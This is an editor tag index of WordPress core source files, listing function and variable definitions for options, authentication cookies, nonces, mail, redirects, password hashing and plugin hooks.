		$cookie = preg_replace( '/[^A-Za-z0-9=&_]/', '', $_COOKIE['wp-settings-' . $user->ID] );cookie670,21241
		$option = get_user_option('user-settings', $user->ID);option676,21444
 * Private. Set all user interface settings.settings685,21596
function wp_set_all_user_settings($all) {wp_set_all_user_settings694,21750
	if ( ! $user = wp_get_current_user() )user697,21826
	$_updated_user_settings = $all;_updated_user_settings700,21883
	$settings = '';settings701,21916
	foreach ( $all as $k => $v ) {k702,21933
		$v = preg_replace( '/[^A-Za-z0-9_]+/', '', $v );v703,21965
	$settings = rtrim($settings, '&');settings707,22056
function delete_all_user_settings() {delete_all_user_settings722,22371
	if ( ! $user = wp_get_current_user() )user723,22409
function get_site_option( $option, $default = false, $use_cache = true ) {get_site_option749,23362
function get_site_option( $option, $default = false, $use_cache = true ) {default749,23362
 	$pre = apply_filters( 'pre_site_option_' . $option, false );pre753,23502
		$default = apply_filters( 'default_site_option_' . $option, $default );default758,23633
		$value = get_option($option, $default);value759,23707
		$cache_key = "{$wpdb->siteid}:$option";cache_key761,23759
			$value = wp_cache_get($cache_key, 'site-options');value763,23821
			$row = $wpdb->get_row( $wpdb->prepare("SELECT meta_value FROM $wpdb->sitemeta WHERE meta_key = %s AND site_id = %d", $option, $wpdb->siteid ) );row766,23924
				$value = $row->meta_value;value770,24194
				$value = maybe_unserialize( $value );value771,24225
				$value = apply_filters( 'default_site_option_' . $option, $default );value774,24335
function add_site_option( $option, $value ) {add_site_option800,25165
	$value = apply_filters( 'pre_add_site_option_' . $option, $value );value803,25227
		$result = add_option( $option, $value );result806,25323
		$cache_key = "{$wpdb->siteid}:$option";cache_key808,25376
		$value = sanitize_option( $option, $value );value813,25483
		$_value = $value;_value816,25585
		$value = maybe_serialize( $value );value817,25605
		$result = $wpdb->insert( $wpdb->sitemeta, array('site_id' => $wpdb->siteid, 'meta_key' => $option, 'meta_value' => $value ) );result818,25643
		$value = $_value;value819,25772
function delete_site_option( $option ) {delete_site_option845,26425
		$result = delete_option( $option );result853,26609
		$row = $wpdb->get_row( $wpdb->prepare( "SELECT meta_id FROM {$wpdb->sitemeta} WHERE meta_key = %s AND site_id = %d", $option, $wpdb->siteid ) );row855,26657
		$cache_key = "{$wpdb->siteid}:$option";cache_key858,26864
		$result = $wpdb->delete( $wpdb->sitemeta, array( 'meta_key' => $option, 'site_id' => $wpdb->siteid ) );result861,26956
function update_site_option( $option, $value ) {update_site_option888,27828
	$oldvalue = get_site_option( $option );oldvalue891,27893
	$value = apply_filters( 'pre_update_site_option_' . $option, $value, $oldvalue );value892,27934
	if ( $value === $oldvalue )value894,28018
		$result = update_option( $option, $value );result901,28164
		$value = sanitize_option( $option, $value );value903,28220
		$cache_key = "{$wpdb->siteid}:$option";cache_key904,28267
		$_value = $value;_value907,28364
		$value = maybe_serialize( $value );value908,28384
		$result = $wpdb->update( $wpdb->sitemeta, array( 'meta_value' => $value ), array( 'site_id' => $wpdb->siteid, 'meta_key' => $option ) );result909,28422
		$value = $_value;value910,28561
function delete_site_transient( $transient ) {delete_site_transient934,29180
		$result = wp_cache_delete( $transient, 'site-transient' );result939,29368
		$option_timeout = '_site_transient_timeout_' . $transient;option_timeout941,29439
		$option = '_site_transient_' . $transient;option942,29500
		$result = delete_site_option( $option );result943,29545
function get_site_transient( $transient ) {get_site_transient972,30435
	$pre = apply_filters( 'pre_site_transient_' . $transient, false );pre975,30517
		$value = wp_cache_get( $transient, 'site-transient' );value980,30662
		$no_timeout = array('update_core', 'update_plugins', 'update_themes');no_timeout983,30827
		$transient_option = '_site_transient_' . $transient;transient_option984,30900
			$transient_timeout = '_site_transient_timeout_' . $transient;transient_timeout986,31004
			$timeout = get_site_option( $transient_timeout );timeout987,31069
		$value = get_site_option( $transient_option );value995,31294
function set_site_transient( $transient, $value, $expiration = 0 ) {set_site_transient1021,32215
function set_site_transient( $transient, $value, $expiration = 0 ) {expiration1021,32215
	$value = apply_filters( 'pre_set_site_transient_' . $transient, $value );value1024,32322
		$result = wp_cache_set( $transient, $value, 'site-transient', $expiration );result1027,32436
		$transient_timeout = '_site_transient_timeout_' . $transient;transient_timeout1029,32525
		$transient = '_site_transient_' . $transient;transient1030,32589
			$result = add_site_option( $transient, $value );result1034,32775
			$result = update_site_option( $transient, $value );result1038,32928

wordpress/wp-includes/pluggable-deprecated.php,1539
function set_current_user($id, $name = '') {set_current_user33,880
function set_current_user($id, $name = '') {name33,880
function get_userdatabylogin($user_login) {get_userdatabylogin50,1328
function get_user_by_email($email) {get_user_by_email67,1768
 * Sets a cookie for a user who just logged in. This function is deprecated.is75,1969
function wp_setcookie($username, $password = '', $already_md5 = false, $home = '', $siteurl = '', $remember = false) {wp_setcookie89,2578
function wp_setcookie($username, $password = '', $already_md5 = false, $home = '', $siteurl = '', $remember = false) {password89,2578
	$user = get_user_by('login', $username);user91,2767
 * Clears the authentication cookie, logging the user out. This function is deprecated.is100,2989
function wp_clearcookie() {wp_clearcookie107,3190
 * Gets the user cookie login. This function is deprecated.is117,3460
 * This function is deprecated and should no longer be extended as it won't beis119,3523
function wp_get_cookie_login() {wp_get_cookie_login128,3784
 * Checks a users login information and logs them in if it checks out. This function is deprecated.is138,3992
 * Plugins extending this function should also provide the global $error and setshould143,4253
function wp_login($username, $password, $deprecated = '') {wp_login156,4741
function wp_login($username, $password, $deprecated = '') {deprecated156,4741
	$user = wp_authenticate($username, $password);user160,4879
	$error = $user->get_error_message();error165,4973

wordpress/wp-includes/pluggable.php,23761
function wp_set_current_user($id, $name = '') {wp_set_current_user27,836
function wp_set_current_user($id, $name = '') {name27,836
	if ( isset( $current_user ) && ( $current_user instanceof WP_User ) && ( $id == $current_user->ID ) )id30,908
	$current_user = new WP_User( $id, $name );current_user33,1036
function wp_get_current_user() {wp_get_current_user51,1349
function get_currentuserinfo() {get_currentuserinfo74,2086
			$cur_id = $current_user->ID;cur_id83,2333
			$current_user = null;current_user84,2365
		$current_user = null;current_user90,2506
	if ( ! $user = wp_validate_auth_cookie() ) {user100,2680
function get_userdata( $user_id ) {get_userdata120,3195
function get_user_by( $field, $value ) {get_user_by135,3639
	$userdata = WP_User::get_data_by( $field, $value );userdata136,3680
	$user = new WP_User;user141,3770
function cache_users( $user_ids ) {cache_users156,4041
	$clean = _get_non_cached_ids( $user_ids, 'users' );clean159,4093
	$list = implode( ',', $clean );list164,4182
	$users = $wpdb->get_results( "SELECT * FROM $wpdb->users WHERE ID IN ($list)" );users166,4216
	$ids = array();ids168,4299
function wp_mail( $to, $subject, $message, $headers = '', $attachments = array() ) {wp_mail214,6219
function wp_mail( $to, $subject, $message, $headers = '', $attachments = array() ) {headers214,6219
		$attachments = explode( "\n", str_replace( "\r\n", "\n", $attachments ) );attachments219,6510
		$phpmailer = new PHPMailer( true );phpmailer227,6829
		$headers = array();headers232,6911
			// Explode the headers out, so this function can take bothcan235,6976
			$tempheaders = explode( "\n", str_replace( "\r\n", "\n", $headers ) );tempheaders237,7084
			$tempheaders = $headers;tempheaders239,7169
		$headers = array();headers241,7201
		$cc = array();cc242,7223
		$bcc = array();bcc243,7240
						$parts = preg_split('/boundary=/i', trim( $header ) );parts251,7515
						$boundary = trim( str_replace( array( "'", '"' ), '', $parts[1] ) );boundary252,7576
				$name    = trim( $name    );name260,7790
				$content = trim( $content );content261,7823
							$from_name = substr( $content, 0, strpos( $content, '<' ) - 1 );from_name268,8069
							$from_name = str_replace( '"', '', $from_name );from_name269,8141
							$from_name = trim( $from_name );from_name270,8197
							$from_email = substr( $content, strpos( $content, '<' ) + 1 );from_email272,8238
							$from_email = str_replace( '>', '', $from_email );from_email273,8308
							$from_email = trim( $from_email );from_email274,8366
							$from_email = trim( $content );from_email276,8423
							$content_type = trim( $type );content_type282,8617
								$charset = trim( str_replace( array( 'charset=', '"' ), '', $charset ) );charset284,8713
								$boundary = trim( str_replace( array( 'BOUNDARY=', 'boundary=', '"' ), '', $charset ) );boundary286,8860
								$charset = '';charset287,8957
							$content_type = trim( $content );content_type290,9004
						$cc = array_merge( (array) $cc, explode( ',', $content ) );cc294,9082
						$bcc = array_merge( (array) $bcc, explode( ',', $content ) );bcc297,9178
		$from_name = 'WordPress';from_name320,9759
		$sitename = strtolower( $_SERVER['SERVER_NAME'] );sitename331,10245
			$sitename = substr( $sitename, 4 );sitename333,10345
		$from_email = 'wordpress@' . $sitename;from_email336,10389
		$to = explode( ',', $to );to345,10709
			$recipient_name = '';recipient_name350,10876
					$recipient_name = $matches[1];recipient_name353,10999
					$recipient = $matches[2];recipient354,11035
				$recipient_name = '';recipient_name372,11490
						$recipient_name = $matches[1];recipient_name375,11616
						$recipient = $matches[2];recipient376,11653
				$recipient_name = '';recipient_name390,11983
						$recipient_name = $matches[1];recipient_name393,12109
						$recipient = $matches[2];recipient394,12146
		$content_type = 'text/plain';content_type410,12488
	$content_type = apply_filters( 'wp_mail_content_type', $content_type );content_type412,12521
		$charset = get_bloginfo( 'charset' );charset422,12846
		foreach( (array) $headers as $name => $content ) {name429,13046
function wp_authenticate($username, $password) {wp_authenticate470,14080
	$username = sanitize_user($username);username471,14129
	$password = trim($password);password472,14168
	$user = apply_filters('authenticate', null, $username, $password);user474,14199
	if ( $user == null ) {user476,14268
		$user = new WP_Error('authentication_failed', __('<strong>ERROR</strong>: Invalid username or incorrect password.'));user479,14439
	$ignore_codes = array('empty_username', 'empty_password');ignore_codes482,14563
function wp_logout() {wp_logout498,14872
function wp_validate_auth_cookie($cookie = '', $scheme = '') {wp_validate_auth_cookie520,15565
function wp_validate_auth_cookie($cookie = '', $scheme = '') {scheme520,15565
	if ( ! $cookie_elements = wp_parse_auth_cookie($cookie, $scheme) ) {cookie_elements521,15628
	$expired = $expiration;expired528,15819
	$user = get_user_by('login', $username);user540,16145
	$pass_frag = substr($user->user_pass, 8, 4);pass_frag546,16284
	$key = wp_hash($username . $pass_frag . '|' . $expiration, $scheme);key548,16331
	$hash = hash_hmac('md5', $username . '|' . $expiration, $key);hash549,16401
function wp_generate_auth_cookie($user_id, $expiration, $scheme = 'auth') {wp_generate_auth_cookie578,17220
function wp_generate_auth_cookie($user_id, $expiration, $scheme = 'auth') {scheme578,17220
	$user = get_userdata($user_id);user579,17296
	$pass_frag = substr($user->user_pass, 8, 4);pass_frag581,17330
	$key = wp_hash($user->user_login . $pass_frag . '|' . $expiration, $scheme);key583,17377
	$hash = hash_hmac('md5', $user->user_login . '|' . $expiration, $key);hash584,17455
	$cookie = $user->user_login . '|' . $expiration . '|' . $hash;cookie586,17528
function wp_parse_auth_cookie($cookie = '', $scheme = '') {wp_parse_auth_cookie602,17966
function wp_parse_auth_cookie($cookie = '', $scheme = '') {scheme602,17966
				$cookie_name = AUTH_COOKIE;cookie_name606,18087
				$cookie_name = SECURE_AUTH_COOKIE;cookie_name609,18153
				$cookie_name = LOGGED_IN_COOKIE;cookie_name612,18224
					$cookie_name = SECURE_AUTH_COOKIE;cookie_name616,18306
					$scheme = 'secure_auth';scheme617,18346
					$cookie_name = AUTH_COOKIE;cookie_name619,18389
					$scheme = 'auth';scheme620,18422
		$cookie = $_COOKIE[$cookie_name];cookie626,18515
	$cookie_elements = explode('|', $cookie);cookie_elements629,18555
function wp_set_auth_cookie($user_id, $remember = false, $secure = '') {wp_set_auth_cookie652,19215
function wp_set_auth_cookie($user_id, $remember = false, $secure = '') {remember652,19215
		$expiration = $expire = time() + apply_filters('auth_cookie_expiration', 1209600, $user_id, $remember);expiration654,19308
		$expiration = time() + apply_filters('auth_cookie_expiration', 172800, $user_id, $remember);expiration656,19424
		$expire = 0;expire657,19519
		$secure = is_ssl();secure661,19561
	$secure = apply_filters('secure_auth_cookie', $secure, $user_id);secure663,19584
	$secure_logged_in_cookie = apply_filters('secure_logged_in_cookie', false, $user_id, $secure);secure_logged_in_cookie664,19651
		$auth_cookie_name = SECURE_AUTH_COOKIE;auth_cookie_name667,19766
		$scheme = 'secure_auth';scheme668,19808
		$auth_cookie_name = AUTH_COOKIE;auth_cookie_name670,19845
		$scheme = 'auth';scheme671,19880
	$auth_cookie = wp_generate_auth_cookie($user_id, $expiration, $scheme);auth_cookie674,19904
	$logged_in_cookie = wp_generate_auth_cookie($user_id, $expiration, 'logged_in');logged_in_cookie675,19977
function wp_clear_auth_cookie() {wp_clear_auth_cookie694,20878
function is_user_logged_in() {is_user_logged_in726,22349
	$user = wp_get_current_user();user727,22380
function auth_redirect() {auth_redirect742,22626
	$secure = ( is_ssl() || force_ssl_admin() );secure745,22729
	$secure = apply_filters('secure_auth_redirect', $secure);secure747,22776
		$scheme = 'logged_in';scheme761,23260
		$scheme = apply_filters( 'auth_redirect_scheme', '' );scheme763,23291
	if ( $user_id = wp_validate_auth_cookie( '',  $scheme) ) {user_id765,23349
		$proto = 'https://';proto786,24027
		$proto = 'http://';proto788,24056
	$redirect = ( strpos($_SERVER['REQUEST_URI'], '/options.php') && wp_get_referer() ) ? wp_get_referer() : $proto . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];redirect790,24079
	$login_url = wp_login_url($redirect, true);login_url792,24244
function check_admin_referer($action = -1, $query_arg = '_wpnonce') {check_admin_referer811,24688
function check_admin_referer($action = -1, $query_arg = '_wpnonce') {query_arg811,24688
	$adminurl = strtolower(admin_url());adminurl815,24911
	$referer = strtolower(wp_get_referer());referer816,24949
	$result = isset($_REQUEST[$query_arg]) ? wp_verify_nonce($_REQUEST[$query_arg], $action) : false;result817,24991
function check_ajax_referer( $action = -1, $query_arg = false, $die = true ) {check_ajax_referer835,25557
function check_ajax_referer( $action = -1, $query_arg = false, $die = true ) {action835,25557
		$nonce = $_REQUEST[$query_arg];nonce837,25655
		$nonce = isset($_REQUEST['_ajax_nonce']) ? $_REQUEST['_ajax_nonce'] : $_REQUEST['_wpnonce'];nonce839,25695
	$result = wp_verify_nonce( $nonce, $action );result841,25791
function wp_redirect($location, $status = 302) {wp_redirect867,26360
function wp_redirect($location, $status = 302) {status867,26360
	$location = apply_filters('wp_redirect', $location, $status);location870,26427
	$status = apply_filters('wp_redirect_status', $status, $location);status871,26490
	$location = wp_sanitize_redirect($location);location876,26649
function wp_sanitize_redirect($location) {wp_sanitize_redirect893,27047
	$location = preg_replace('|[^a-z0-9-~+_.?#=&;,/:%!]|i', '', $location);location894,27090
	$location = wp_kses_no_null($location);location895,27163
	$strip = array('%0d', '%0a', '%0D', '%0A');strip898,27242
	$location = _deep_replace($strip, $location);location899,27287
function wp_safe_redirect($location, $status = 302) {wp_safe_redirect921,27980
function wp_safe_redirect($location, $status = 302) {status921,27980
	$location = wp_sanitize_redirect($location);location924,28103
	$location = wp_validate_redirect($location, admin_url());location926,28150
function wp_validate_redirect($location, $default = '') {wp_validate_redirect950,28921
function wp_validate_redirect($location, $default = '') {default950,28921
		$location = 'http:' . $location;location953,29122
	$test = ( $cut = strpos($location, '?') ) ? substr( $location, 0, $cut ) : $location;test956,29241
	$lp  = parse_url($test);lp958,29329
	$wpp = parse_url(home_url());wpp972,29793
	$allowed_hosts = (array) apply_filters('allowed_redirect_hosts', array($wpp['host']), isset($lp['host']) ? $lp['host'] : '');allowed_hosts974,29825
		$location = $default;location977,30068
function wp_notify_postauthor( $comment_id, $comment_type = '' ) {wp_notify_postauthor993,30500
function wp_notify_postauthor( $comment_id, $comment_type = '' ) {comment_type993,30500
	$comment = get_comment( $comment_id );comment994,30567
	$post    = get_post( $comment->comment_post_ID );post995,30607
	$author  = get_userdata( $post->post_author );author996,30658
	$comment_author_domain = @gethostbyaddr($comment->comment_author_IP);comment_author_domain1010,31029
	$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);blogname1014,31262
	if ( empty( $comment_type ) ) $comment_type = 'comment';comment_type1016,31336
		$notify_message  = sprintf( __( 'New comment on your post "%s"' ), $post->post_title ) . "\r\n";notify_message1019,31430
		$subject = sprintf( __('[%1$s] Comment: "%2$s"'), $blogname, $post->post_title );subject1028,32279
		$notify_message  = sprintf( __( 'New trackback on your post "%s"' ), $post->post_title ) . "\r\n";notify_message1030,32406
		$subject = sprintf( __('[%1$s] Trackback: "%2$s"'), $blogname, $post->post_title );subject1037,33046
		$notify_message  = sprintf( __( 'New pingback on your post "%s"' ), $post->post_title ) . "\r\n";notify_message1039,33174
		$subject = sprintf( __('[%1$s] Pingback: "%2$s"'), $blogname, $post->post_title );subject1046,33842
	$wp_email = 'wordpress@' . preg_replace('#^www\.#', '', strtolower($_SERVER['SERVER_NAME']));wp_email1056,34520
		$from = "From: \"$blogname\" <$wp_email>";from1059,34657
			$reply_to = "Reply-To: $comment->comment_author_email";reply_to1061,34748
		$from = "From: \"$comment->comment_author\" <$wp_email>";from1063,34817
			$reply_to = "Reply-To: \"$comment->comment_author_email\" <$comment->comment_author_email>";reply_to1065,34923
	$message_headers = "$from\n"message_headers1068,35023
	$notify_message = apply_filters('comment_notification_text', $notify_message, $comment_id);notify_message1074,35202
	$subject = apply_filters('comment_notification_subject', $subject, $comment_id);subject1075,35295
	$message_headers = apply_filters('comment_notification_headers', $message_headers, $comment_id);message_headers1076,35377
function wp_notify_moderator($comment_id) {wp_notify_moderator1094,35830
	$comment = get_comment($comment_id);comment1100,35953
	$post = get_post($comment->comment_post_ID);post1101,35991
	$user = get_userdata( $post->post_author );user1102,36037
	$email_to = array( get_option('admin_email') );email_to1104,36174
	$comment_author_domain = @gethostbyaddr($comment->comment_author_IP);comment_author_domain1108,36398
	$comments_waiting = $wpdb->get_var("SELECT count(comment_ID) FROM $wpdb->comments WHERE comment_approved = '0'");comments_waiting1109,36469
	$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);blogname1113,36746
			$notify_message  = sprintf( __('A new trackback on the post "%s" is waiting for your approval'), $post->post_title ) . "\r\n";notify_message1118,36876
			$notify_message  = sprintf( __('A new pingback on the post "%s" is waiting for your approval'), $post->post_title ) . "\r\n";notify_message1125,37463
			$notify_message  = sprintf( __('A new comment on the post "%s" is waiting for your approval'), $post->post_title ) . "\r\n";notify_message1132,38051
	$subject = sprintf( __('[%1$s] Please moderate: "%2$s"'), $blogname, $post->post_title );subject1153,39676
	$message_headers = '';message_headers1154,39767
	$notify_message = apply_filters('comment_moderation_text', $notify_message, $comment_id);notify_message1156,39792
	$subject = apply_filters('comment_moderation_subject', $subject, $comment_id);subject1157,39883
	$message_headers = apply_filters('comment_moderation_headers', $message_headers);message_headers1158,39963
function wp_password_change_notification(&$user) {wp_password_change_notification1175,40368
		$message = sprintf(__('Password Lost and Changed for user: %s'), $user->user_login) . "\r\n";message1179,40621
		$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);blogname1182,40880
function wp_new_user_notification($user_id, $plaintext_pass = '') {wp_new_user_notification1197,41315
function wp_new_user_notification($user_id, $plaintext_pass = '') {plaintext_pass1197,41315
	$user = new WP_User($user_id);user1198,41383
	$user_login = stripslashes($user->user_login);user_login1200,41416
	$user_email = stripslashes($user->user_email);user_email1201,41464
	$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);blogname1205,41674
	$message  = sprintf(__('New user registration on your site %s:'), $blogname) . "\r\n\r\n";message1207,41748
	$message  = sprintf(__('Username: %s'), $user_login) . "\r\n";message1216,42116
function wp_nonce_tick() {wp_nonce_tick1236,42639
	$nonce_life = apply_filters('nonce_life', 86400);nonce_life1237,42666
function wp_verify_nonce($nonce, $action = -1) {wp_verify_nonce1256,43297
function wp_verify_nonce($nonce, $action = -1) {action1256,43297
	$user = wp_get_current_user();user1257,43346
	$uid = (int) $user->ID;uid1258,43378
	$i = wp_nonce_tick();i1260,43404
function wp_create_nonce($action = -1) {wp_create_nonce1282,43946
	$user = wp_get_current_user();user1283,43987
	$uid = (int) $user->ID;uid1284,44019
	$i = wp_nonce_tick();i1286,44045
 * define('AUTH_KEY',         ' Xakm<o xQy rw4EMsLKM-?!T+,PFF})H4lzcW57AF0U@N@< >M%G4Yt>f`z]MON');AUTH_KEY1307,44811
 * define('SECURE_AUTH_KEY',  'LzJ}op]mr|6+![P}Ak:uNdJCJZd>(Hx.-Mh#Tz)pCIU#uGEnfFz|f ;;eU%/U^O~');SECURE_AUTH_KEY1308,44910
 * define('LOGGED_IN_KEY',    '|i|Ux`9<p-h$aFf(qnT:sDO:D1P^wZ$$/Ra@miTJi9G;ddp_<q}6H1)o|a +&JCM');LOGGED_IN_KEY1309,45009
 * define('NONCE_KEY',        '%:R{[P|,s.KuMltH5}cI;/k<Gx~j!f0I)m_sIyu+&NJZ)-iO>z7X>QYR0Z_XnZ@|');NONCE_KEY1310,45108
 * define('AUTH_SALT',        'eZyT)-Naw]F8CwA*VaW#q*|.)g@o}||wf~@C-YSt}(dh_r6EbI#A,y|nU2{B#JBW');AUTH_SALT1311,45207
 * define('SECURE_AUTH_SALT', '!=oLUTXh,QW=H `}`L|9/^4-3 STz},T(w}W<I`.JjPi)<Bmf1v,HpGe}T1:Xt7n');SECURE_AUTH_SALT1312,45306
 * define('LOGGED_IN_SALT',   '+XSqHc;@Q*K_b|Z?NC[3H!!EONbh.n<+=uKR:>*c(u`g~EJBf#8u#R{mUEZrozmm');LOGGED_IN_SALT1313,45405
 * define('NONCE_SALT',       'h`GXHhD>SLWVfg1(1(N{;.V!MoE(SfbA_ksP@&`+AycHcAV$+?@3q+rxV{%^VyKT');NONCE_SALT1314,45504
function wp_salt( $scheme = 'auth' ) {wp_salt1327,45995
function wp_salt( $scheme = 'auth' ) {scheme1327,45995
	static $cached_salts = array();cached_salts1328,46034
	static $cached_salts = array();cached_salts1328,46034
	static $duplicated_keys;duplicated_keys1332,46179
		$duplicated_keys = array( 'put your unique phrase here' => true );duplicated_keys1334,46241
				$value = constant( "{$first}_{$second}" );value1339,46510
	$key = $salt = '';key1345,46640
		$key = SECRET_KEY;key1347,46749
		$salt = SECRET_SALT;salt1349,46883
			$const = strtoupper( "{$scheme}_{$type}" );const1353,47039
			$key = get_site_option( 'secret_key' );key1366,47477
				$key = wp_generate_password( 64, true, true );key1368,47539
		$salt = hash_hmac( 'md5', $scheme, $key );salt1372,47645
function wp_hash($data, $scheme = 'auth') {wp_hash1390,48022
function wp_hash($data, $scheme = 'auth') {scheme1390,48022
	$salt = wp_salt($scheme);salt1391,48066
 * For integration with other applications, this function can be overwritten tocan1401,48250
function wp_hash_password($password) {wp_hash_password1411,48605
		$wp_hasher = new PasswordHash(8, true);wp_hasher1417,48803
 * and the function compares the plain text password when encrypted similarlycompares1430,49184
 * For integration with other applications, this function can be overwritten tocan1433,49329
function wp_check_password($password, $hash, $user_id = '') {wp_check_password1445,49836
function wp_check_password($password, $hash, $user_id = '') {user_id1445,49836
		$check = ( $hash == md5($password) );check1450,49981
			$hash = wp_hash_password($password);hash1454,50121
		$wp_hasher = new PasswordHash(8, true);wp_hasher1465,50480
	$check = $wp_hasher->CheckPassword($password, $hash);check1468,50526
function wp_generate_password( $length = 12, $special_chars = true, $extra_special_chars = false ) {wp_generate_password1486,51153
function wp_generate_password( $length = 12, $special_chars = true, $extra_special_chars = false ) {length1486,51153
	$chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';chars1487,51254
	$password = '';password1493,51445
	for ( $i = 0; $i < $length; $i++ ) {i1494,51462
	// random_password filter was previously in random_password function which was deprecatedwhich1498,51570
function wp_rand( $min = 0, $max = 0 ) {wp_rand1513,52043
function wp_rand( $min = 0, $max = 0 ) {min1513,52043
			static $seed = '';seed1520,52285
			static $seed = '';seed1520,52285
			$seed = get_transient('random_seed');seed1522,52314
		$rnd_value = md5( uniqid(microtime() . mt_rand(), true ) . $seed );rnd_value1523,52355
		$seed = md5($seed . $rnd_value);seed1526,52501
	$value = substr($rnd_value, 0, 8);value1532,52662
	$rnd_value = substr($rnd_value, 8);rnd_value1535,52780
	$value = abs(hexdec($value));value1537,52818
		$value = $min + (($max - $min + 1) * ($value / (4294967295 + 1)));value1542,52970
 * For integration with other applications, this function can be overwritten tocan1552,53188
function wp_set_password( $password, $user_id ) {wp_set_password1562,53592
	$hash = wp_hash_password($password);hash1565,53658
function get_avatar( $id_or_email, $size = '96', $default = '', $alt = false ) {get_avatar1583,54338
function get_avatar( $id_or_email, $size = '96', $default = '', $alt = false ) {size1583,54338
		$safe_alt = '';safe_alt1588,54495
		$safe_alt = esc_attr( $alt );safe_alt1590,54519
		$size = '96';size1593,54579
	$email = '';email1595,54596
		$id = (int) $id_or_email;id1597,54645
		$user = get_userdata($id);user1598,54673
			$email = $user->user_email;email1600,54717
		$allowed_comment_types = apply_filters( 'get_avatar_comment_types', array( 'comment' ) );allowed_comment_types1603,54831
			$id = (int) $id_or_email->user_id;id1608,55105
			$user = get_userdata($id);user1609,55143
				$email = $user->user_email;email1611,55188
			$email = $id_or_email->comment_author_email;email1613,55280
		$email = $id_or_email;email1616,55342
		$avatar_default = get_option('avatar_default');avatar_default1620,55397
			$default = 'mystery';default1622,55479
			$default = $avatar_default;default1624,55511
		$email_hash = md5( strtolower( trim( $email ) ) );email_hash1628,55569
		$host = 'https://secure.gravatar.com';host1631,55642
			$host = sprintf( "http://%d.gravatar.com", ( hexdec( $email_hash[0] ) % 2 ) );host1634,55717
			$host = 'http://0.gravatar.com';host1636,55806
		$default = "$host/avatar/ad516503a11cd5ca435acc9bb6523536?s={$size}"; // ad516503a11cd5ca435acc9bb6523536 == md5('unknown@gravatar.com')default1640,55876
		$default = includes_url('images/blank.gif');default1642,56047
		$default = '';default1644,56155
		$default = "$host/avatar/?s={$size}";default1646,56215
		$default = "$host/avatar/?d=$default&amp;s={$size}";default1648,56281
		$default = add_query_arg( 's', $size, $default );default1650,56382
		$out = "$host/avatar/";out1653,56460
		$rating = get_option('avatar_rating');rating1658,56578
		$avatar = "<img alt='{$safe_alt}' src='{$out}' class='avatar avatar-{$size} photo' height='{$size}' width='{$size}' />";avatar1662,56678
		$avatar = "<img alt='{$safe_alt}' src='{$default}' class='avatar avatar-{$size} photo avatar-default' height='{$size}' width='{$size}' />";avatar1664,56811
function wp_text_diff( $left_string, $right_string, $args = null ) {wp_text_diff1698,58221
function wp_text_diff( $left_string, $right_string, $args = null ) {args1698,58221
	$defaults = array( 'title' => '', 'title_left' => '', 'title_right' => '' );defaults1699,58290
	$args = wp_parse_args( $args, $defaults );args1700,58368
	$left_string  = normalize_whitespace($left_string);left_string1705,58516
	$right_string = normalize_whitespace($right_string);right_string1706,58569
	$left_lines  = explode("\n", $left_string);left_lines1708,58624
	$right_lines = explode("\n", $right_string);right_lines1709,58669
	$text_diff = new Text_Diff($left_lines, $right_lines);text_diff1711,58716
	$renderer  = new WP_Text_Diff_Renderer_Table();renderer1712,58772
	$diff = $renderer->render($text_diff);diff1713,58821
	$r  = "<table class='diff'>\n";r1718,58891

wordpress/wp-includes/plugin.php,9316
 * Hooks a function or method to a specific filter action.or23,782
 * function example_hook($example) { echo $example; }example_hook34,1251
 * <strong>Note:</strong> the function will return true no matter if thewill46,1850
 * function was hooked fails or not. There are no checks for whether thewas47,1923
 * function exists beforehand and no checks to whether the <tt>$function_to_addexists48,1996
 * @param callback $function_to_add The name of the function to be called when the filter is applied.to60,2705
 * @param int $accepted_args optional. The number of arguments the function accept (default 1).accept62,3106
function add_filter($tag, $function_to_add, $priority = 10, $accepted_args = 1) {add_filter65,3230
function add_filter($tag, $function_to_add, $priority = 10, $accepted_args = 1) {priority65,3230
	$idx = _wp_filter_build_unique_id($tag, $function_to_add, $priority);idx68,3350
 * @param callback $function_to_check optional. If specified, return the priority of that function on this hook or false if not attached.on83,3812
function has_filter($tag, $function_to_check = false) {has_filter86,4050
function has_filter($tag, $function_to_check = false) {function_to_check86,4050
	$has = !empty($wp_filter[$tag]);has89,4127
 * this function. This function can be used to create a new filter hook bycan108,4613
 * simply calling this function with the name of the new hook specified usingwith109,4688
 * The function allows for additional arguments to be added and passed to hooks.allows112,4792
 * function example_hook($string, $arg1, $arg2)example_hook114,4883
 * $value = apply_filters('example_filter', 'filter me', 'arg1', 'arg2');value119,4976
function apply_filters($tag, $value) {apply_filters134,5681
	$args = array();args137,5778
		$args = func_get_args();args142,5890
		$args = func_get_args();args164,6309
				$value = call_user_func_array($the_['function'], array_slice($args, 1, (int) $the_['accepted_args']));value170,6461
 * @see apply_filters() This function is identical, but the arguments passed to theis183,6772
function apply_filters_ref_array($tag, $args) {apply_filters_ref_array197,7440
		$all_args = func_get_args();all_args203,7639
 * Removes a function from a specified filter hook.from237,8365
 * This function removes a function attached to a specified filter hook. Thisremoves239,8420
 * @param string $tag The filter hook to which the function to be removed is hooked.to251,8894
 * @param callback $function_to_remove The name of the function which should be removed.which252,8979
 * @param int $accepted_args optional. The number of arguments the function accepts (default: 1).accepts254,9146
 * @return boolean Whether the function existed before it was removed.existed255,9244
function remove_filter($tag, $function_to_remove, $priority = 10, $accepted_args = 1) {remove_filter257,9319
function remove_filter($tag, $function_to_remove, $priority = 10, $accepted_args = 1) {priority257,9319
	$function_to_remove = _wp_filter_build_unique_id($tag, $function_to_remove, $priority);function_to_remove258,9407
	$r = isset($GLOBALS['wp_filter'][$tag][$priority][$function_to_remove]);r260,9497
function remove_all_filters($tag, $priority = false) {remove_all_filters281,10046
function remove_all_filters($tag, $priority = false) {priority281,10046
function current_filter() {current_filter306,10589
 * Hooks a function on to a specific action.on312,10687
 * @param callback $function_to_add The name of the function you wish to be called.you326,11218
 * @param int $accepted_args optional. The number of arguments the function accept (default 1).accept328,11601
function add_action($tag, $function_to_add, $priority = 10, $accepted_args = 1) {add_action330,11701
function add_action($tag, $function_to_add, $priority = 10, $accepted_args = 1) {priority330,11701
 * This function invokes all functions attached to action hook $tag. It isinvokes337,11919
 * @see apply_filters() This function works similar with the exception thatworks344,12235
